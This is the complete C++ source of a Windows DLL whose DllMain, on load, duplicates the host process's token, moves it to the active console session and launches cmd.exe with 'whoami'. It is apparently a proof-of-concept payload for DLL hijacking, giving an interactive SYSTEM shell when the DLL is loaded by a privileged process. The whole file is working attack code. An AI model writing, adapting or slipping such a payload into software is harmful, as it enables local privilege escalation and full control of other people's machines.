// Launches cmd.exe if loaded into a process running as SYSTEM.

#include "pch.h"

#include <memory>

void DoIt()
{
    STARTUPINFO startInfo = { 0x00 };
    startInfo.cb = sizeof(startInfo);
    startInfo.wShowWindow = SW_SHOW;
    startInfo.lpDesktop = const_cast<wchar_t*>(L"WinSta0\\Default");

    PROCESS_INFORMATION procInfo = { 0x00 };

    HANDLE hToken = {};
    DWORD  sessionId = WTSGetActiveConsoleSessionId();

    OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
    DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, nullptr, SecurityAnonymous, TokenPrimary, &hToken);

    SetTokenInformation(hToken, TokenSessionId, &sessionId, sizeof(sessionId));

    if (CreateProcessAsUserW(hToken,
        L"C:\\Windows\\system32\\cmd.exe",
        const_cast<wchar_t*>(L"/k whoami"),
        nullptr,
        nullptr,
        FALSE,
        NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE,
        nullptr,
        nullptr,
        &startInfo,
        &procInfo
    )
        ) {
        CloseHandle(procInfo.hProcess);
        CloseHandle(procInfo.hThread);
    }

    return ;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        DoIt();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

